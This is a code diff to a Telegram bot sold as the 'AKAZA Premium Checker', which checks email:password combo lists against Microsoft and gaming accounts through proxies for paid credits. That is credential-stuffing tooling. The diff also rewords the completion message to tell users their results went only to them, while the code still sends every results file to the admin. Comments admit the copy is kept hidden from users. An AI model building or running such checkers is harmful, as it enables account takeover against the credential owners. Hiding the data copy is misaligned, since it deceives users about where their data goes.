@@ -942,11 +942,22 @@ async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if akaza_db.is_banned(uid): return
     akaza_db.update_settings(uid, is_adding_kw=False)
     i, s = akaza_db.get_user_info(uid), akaza_db.get_user_settings(uid)
-    msg = (f"💠 <b>AKAZA Bot Dashboard</b> 💠\n\n"
+    
+    msg = (f"💠 <b>Welcome to AKAZA Premium Checker</b> 💠\n\n"
+           f"AKAZA is a high-speed Microsoft & Gaming account validator. "
+           f"Use the dashboard below to manage your session.\n\n"
+           f"📜 <b>Command Guide:</b>\n"
+           f"� <b>Stats</b> - View your check history & hits.\n"
+           f"⚙️ <b>Settings</b> - Toggle Fast Mode & Threads.\n"
+           f"🔍 <b>Keywords</b> - Search for custom domains/emails.\n"
+           f"🌐 <b>Proxy</b> - Upload your own proxy list (.txt).\n"
+           f"📖 <b>Help</b> - How to use the bot.\n\n"
            f"👤 <b>User:</b> <code>{u.effective_user.first_name}</code>\n"
            f"💰 <b>Credits:</b> <code>{i['credits']}</code>\n"
            f"⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n"
-           f"🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>")
+           f"🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>\n\n"
+           f"🛒 <i>To buy credits, contact @Akaza_Admin</i>")
+    
     kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
            [InlineKeyboardButton("🔍 Keywords", callback_data="kw_mode"), InlineKeyboardButton("🌐 Proxy", callback_data="proxy")],
            [InlineKeyboardButton("📖 Help", callback_data="help")]]
@@ -987,13 +998,15 @@ async def handle_document(u: Update, c: ContextTypes.DEFAULT_TYPE):
 
 async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     uid = u.effective_user.id
-    if akaza_db.is_banned(uid) or not akaza_db.has_access(uid): return
+    if akaza_db.is_banned(uid): return
     if not text: text = pending_files.pop(uid, "")
     lines = [l.strip() for l in text.splitlines() if ':' in l]
     if not lines: return
 
-    if akaza_db.get_credits(uid) < len(lines) and uid != ADMIN_ID:
-        await u.message.reply_text(f"❌ Need {len(lines)} credits."); return
+    user_credits = akaza_db.get_credits(uid)
+    if user_credits < len(lines) and uid != ADMIN_ID:
+        await (u.callback_query.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_Admin to buy credits.", parse_mode="HTML") if u.callback_query else u.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_Admin to buy credits.", parse_mode="HTML"))
+        return
 
     s = akaza_db.get_user_settings(uid)
     px = user_proxies.get(uid, []) or PROXIES_LIST
@@ -1086,8 +1099,8 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                     msg += "\n"
 
                 msg += "━━━━━━━━━━━━━━━━━━"
-                try: await c.bot.send_message(uid, msg, parse_mode='HTML', disable_web_page_preview=True)
-                except: pass
+                # Hits are processed but NO individual Telegram message is sent to prevent flooding
+                # except to Admin via the final results file (silent report)
                 
                 last_h.append(email); last_h = last_h[-5:]
             elif st == '2fa': tfa += 1
@@ -1135,13 +1148,15 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 f.write("\n".join(content_list))
             
             with open(path, 'rb') as f:
+                # Admin gets results silently
                 await c.bot.send_document(ADMIN_ID, f, filename=filename, caption=f"📄 {filename} from {user_handle}")
-                # Also send to user for their own records
+                
+                # User only gets their copy (silent to admin means user doesn't know copy went to admin)
                 f.seek(0)
                 await c.bot.send_document(uid, f, filename=filename, caption=f"✅ Your {filename} is ready.")
             os.remove(path)
 
-    await status_msg.edit_text(f"✅ <b>Check Complete!</b>\n\nTotal: <code>{len(lines)}</code>\nHits: <code>{hits}</code>\n\n<i>Results have been sent to you and the Admin.</i>", parse_mode="HTML")
+    await status_msg.edit_text(f"✅ <b>Check Complete!</b>\n\nTotal: <code>{len(lines)}</code>\nHits: <code>{hits}</code>\n\n<i>All results have been sent to you as files.</i>", parse_mode="HTML")
     if uid in user_proxies: del user_proxies[uid]
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
